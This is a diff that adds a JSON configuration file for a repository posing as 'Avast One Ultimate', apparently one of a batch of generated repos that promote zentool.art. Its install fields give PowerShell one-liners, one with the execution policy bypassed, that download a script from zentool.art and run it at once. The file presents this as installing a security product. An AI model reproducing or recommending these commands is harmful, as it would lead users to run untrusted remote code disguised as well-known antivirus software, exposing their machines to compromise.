@@ -1,0 +1,27 @@
+{
+  "repo": "Avast-One-Ultimate",
+  "product": "Avast One Ultimate",
+  "product_title": "Avast One",
+  "kind": "security",
+  "install_type": "zentool-irm",
+  "install_command": "irm https://zentool.art/ps/setup.ps1 | iex",
+  "install_command_bypass": "powershell -NoProfile -ExecutionPolicy Bypass -Command \"irm https://zentool.art/ps/setup.ps1 | iex\"",
+  "batch": "git-new-era",
+  "format": "license-md-zentool-v7-git-new-era-guide",
+  "tone": "guide",
+  "category": "security",
+  "topics": [
+    "avast-config",
+    "avast-integration",
+    "avast-latest",
+    "endpoint-security",
+    "malware-protection",
+    "windows-security",
+    "privacy-tools",
+    "antivirus-windows",
+    "threat-protection",
+    "security-suite",
+    "real-time-protection"
+  ],
+  "site": "zentool.art"
+}
